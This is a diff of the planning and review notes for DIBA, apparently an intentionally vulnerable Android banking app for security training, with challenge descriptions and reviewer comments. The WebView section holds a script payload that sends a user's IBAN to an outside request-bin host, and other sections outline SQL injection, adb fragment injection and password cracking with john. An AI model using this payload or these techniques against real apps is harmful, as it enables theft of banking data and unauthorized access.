@@ -14,27 +14,47 @@ Add license files & information.
 
 Replace "please update to receive the messages" with a text that tells the user what to do.
 
-Use DIBA logo also for the exploit ab, but with a little difference to the real app.
+Use DIBA logo also for the exploit ab, but with a little difference to the real app. As the logo looks similar to the one of DIBA: An alternative would be to use the same logo as the bank, but with a big red E in the top right corner?
 
 Menu should be:
 
-Settings
-   App Settings
-   Meta Settings
-About
-   About the App
-
-Accept the payment activity, use this text:
-
-An SMS message with a code to confirm the payment was sent to your phone (the SMS message is simulated and you can get the code from the server output). Enter the code to confirm the payment.
-
-(Or to prove that you managed to crack the code generation algorithm: Enter the code that would be used if the payment were done at 2030-01-31 12:00:00)
-
 Intend redirection attack: value "1000" is set to wrong Extra.
+You changed the wrong value: You must set the amountSFr to 1000, not the amount, because this is the actual money that is transferred.
 
 DIBA-Exploit Logo
 
 How to reset server?
+
+And can you rename the REDIRECT button to CHANGE DEBUG SETTINGS?
+
+WebView:
+
+Works. Use the following text on the servey page:
+
+Your recently opened account IBAN:
+
+Please let us know what you think - provide a comment and a score from 1 (bad) to 5 (very good).
+
+And make sure to us good comments already in there, so use the following 3 examples:
+
+5: Very good service, thank you!
+
+3:  It’s OK, but I’ve seen better apps.
+
+2: Not happy, I’m thinking about using another bank. 
+
+Messages:
+
+I don’t think these hints are very good so if used, we would have to adapt them. We leave the feature with "hint" in the app, but we shouldn’t tell the user about it. Let’s just use this welcome message:
+
+"Here you can send messages to the bank. You can also search for messages you sent and received before."
+
+Exploit App:
+
+Use this welcome text:
+
+DIBA exploit was developed by the DIBA team. It allows to exploit some of the vulnerabilities in DIBA. You can select the vulnerability to exploit in the menu.
+
 
 ### 1: Certificate Check Security
 
@@ -69,7 +89,7 @@ For usabiliy reasons, DIBA provides a *Remember me* functionality so that during
 ### 4: SQL Injection (easy)
 The *Messages* functionality allows to send and receive messages to/from the bank. The messages are cached locally on the device so that they can be viewed even if there's no network connection. As the app can be used by different users on the same device, messages of multiple users may be cached. Therefore, for confidentiality reasons, a user should only get access to his own messages. Unfortunately, this was not implemented correctly.
 
-**Goal:** Abuse the search field to get access to messages of other users on the same device.
+**Goal:** Abuse the search field to get access to all messages that were sent and received by other users of the same device. If successful, this should allow to get access to a brief exchange of messages between Alice and Bob.
 
 **Check**: Works.
 
@@ -199,7 +219,7 @@ In the file *AndroidManifest.xml* that is part of every app, the developer can s
 
 **Check**: Works
 
-### 20: Fragment injection (easy/medium)
+### 20: Fragment Injection (easy/medium)
 The screens for login and account creation are similar in structure. To make things a bit easier, the developer therefore decided to use a fragment activity to implement this. This means the activity can be started with an argument that specifies the fragment to be loaded. However, as the activity is exported, this implies that an attacker can start this activity as well while specifying any fragment that is part of the app. If this fragment should only be accessible in the authenticated patr of the app, an attacker may get access to information and functionality that shouldn't be accessible to him.
 
 **Goal (easy):** Use adb to directly start the fragment activity while specifying that the fragment with the name *FragmantChange* should be used (this fragment only exists to be used in a proof of concept to exploit the vulnerability). As a result, you should see a fragment with four buttons with the label *Change later*.
@@ -241,16 +261,11 @@ Android apps can use internal SQlite databases. The DIBA app, for instance, uses
 **Check**: Works
 
 ### 25: Native Language Library (hard)
-Vulnerability 27 (Encrypted SQLite Database) uses an encrypted database to locally store the made payments. The key that used for encryption is hidden in the app.
+Vulnerability 26 (Encrypted SQLite Database) uses an encrypted database to locally store the made payments. The key that used for encryption is hidden in the app.
 
-**Goal:** Find the key. When solving vulnerability 27, you'll learn whethter you have found the right key.
+**Goal:** Find the key. When solving vulnerability 26, you'll learn whether you have found the right key.
 
 **Check**: Works
-
-Note: The solution contains 
-Find where the payment database is created.
-find . -type f -exec grep -i paymentdb {} +
-=> This is not so obvious. Why paymentdb?
 
 ### 26: Encrypted SQLite Database (hard)
 Just like with investments (see vulnerability 25), a local database is also used to store the made payments. This time, the developers tried to come up with a more secure solution by encrypting the database with a key hidden in the app. However, assuming an attacker finds this key and gets access to the device, he can still get the database and read its potentially sensitive content.
@@ -286,15 +301,30 @@ And make sure to us good comments already in there, so use the following 3 examp
 
 Note: I only could do string concatenation with the concat method, but not with "+":
 
+<script>
 new Image().src = encodeURI("https://postb.in/1589184632761-8206421809736?iban=".concat(document.getElementById('iban').text));
 </script>
 
 
-### 28: Cracking Weak Password
+### 28: Cracking Weak Password (hard)
 
-Uses no salt, right?
+To get access to stock market data, an access code must be entered. Due to a vulnerability, it is possible to find out the correct code.
 
-What is the correct password?
+**Goal:** Find out the correct access code and get access to the stock matket functionality by entering the code.
+
+**Hint:** The code is based on a common wird and additionally uses letter capitalization and digits.
+
+**Check**: Works. But the solution should be adapted:
+
+- How can the attacker find out that hashing with salt is used? So maybe a foirst step should be to look at one of the decompiled activities.
+
+- Current step 2: Show the content of the filw with real salt & hash
+
+- Also write that one can use also other crackers, so john is just an example
+
+- The format dynamic_61 should be explained. I sent you two links yesterday that behind this format, there is SHA256 over a concatenated salt and password. So just refer to the URL that describes all the formats and briefly write why dynamic_61 is used.
+
+And in the app: Clicking "Stock Market" button brings me to the stock market without any password? And what does the Suscribe button do? I’m not sure that this is implemented correctly. Can you please explain?
 
 ### 29: Root Detection Bypass (hard)
 The DIBA app cointains a simple root detection mechanism. Whenever the app is started, it checks whether the Android device is rooted and displays a message if this is the case. In reality, the app would be now terminated to prevent its usage on rooted (and therefore less secure) devices. However, as a user has full control over the app, he can adapt it by removing the root detection check and as a result of this, the app can also be used on rooted devices.
